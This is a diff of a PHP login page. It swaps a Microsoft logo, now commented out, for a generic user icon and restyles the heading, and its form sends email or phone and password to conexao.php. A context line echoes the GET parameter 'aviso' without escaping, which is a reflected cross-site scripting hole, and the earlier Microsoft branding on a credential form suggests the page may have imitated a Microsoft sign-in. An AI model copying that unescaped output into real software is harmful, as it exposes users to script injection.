@@ -66,6 +66,18 @@
             color: #0078D4;
             text-decoration: none;
         }
+        .user-icon {
+            width: 80px;
+            height: 80px;
+            background-color: #ddd;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 40px;
+            color: #555;
+            margin: 0 auto 00px auto;
+        }
     </style>
 </head>
 <body>
@@ -78,8 +90,8 @@
              echo $_GET["aviso"];
         }
         ?>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
-        <h2>Login</h2>
+        <div class="user-icon">👤</div><!-- <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo"> -->
+        <h2><B>LOGIN</B></h2>
         <form action="conexao.php" method="POST">
             <input type="text" name="email" class="input-field" placeholder="E-mail ou telefone" required>
             <input type="password" name="password" class="input-field" placeholder="Senha" required>
